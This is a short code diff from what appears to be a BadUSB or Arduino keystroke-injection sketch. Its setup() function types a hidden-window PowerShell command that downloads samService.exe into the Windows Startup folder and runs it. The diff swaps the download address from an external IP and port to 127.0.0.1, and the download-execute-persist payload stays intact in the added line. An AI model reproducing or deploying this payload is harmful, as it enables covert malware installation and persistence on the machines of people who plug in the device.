@@ -35,7 +35,7 @@ void setup()
 
   delay(1000);
   
-  RUN("%windir%\\system32\\cmd.exe /c powershell -w hidden \"$R = $env:APPDATA+\'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\samService.exe\';(New-Object Net.WebClient).DownloadFile(\'http://183.96.240.178:1479/samService.exe\', $R);start $R\"");
+  RUN("%windir%\\system32\\cmd.exe /c powershell -w hidden \"$R = $env:APPDATA+\'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\samService.exe\';(New-Object Net.WebClient).DownloadFile(\'http://127.0.0.1:1479/samService.exe\', $R);start $R\"");
   
 }
 
